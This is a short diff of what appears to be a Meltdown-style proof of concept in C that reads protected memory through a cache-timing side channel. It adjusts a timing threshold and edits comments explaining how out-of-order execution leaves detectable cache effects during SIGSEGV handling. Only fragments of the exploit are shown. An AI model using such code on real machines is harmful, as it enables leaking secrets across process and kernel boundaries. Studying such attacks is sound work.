@@ -8,7 +8,7 @@
 #define PAGE_SIZE_SHIFT            (0xC)
 #define PAGE_SIZE_SHIFT_STR        "0xC"
 #define PAGE_SIZE                  (1 << PAGE_SIZE_SHIFT)
-#define CACHE_READ_THRESHOLD_TICKS (80)
+#define CACHE_READ_THRESHOLD_TICKS (100)
 
 
 static jmp_buf jbuf;
@@ -49,10 +49,10 @@ int main()
             
             // Force SIGSEGV is not required if address_to_guess_byte is protected
 
-            // The code below should not be executed because of SEISEGV.
+            // The code below should not be executed because of SEISEGV
             // But don't worry. It most likely will be executed because of out-of-order execution optimizations in Intel CPUs :-)
 
-            // Instructions that Intel CPUs likes to execute out-of-order.
+            // Instructions that Intel CPUs likes to execute out-of-order
             // Once executed they cause cache heat side effect that can be detected while SIGSEGV handling
             asm __volatile__ (
                 "%=:                                  \n"
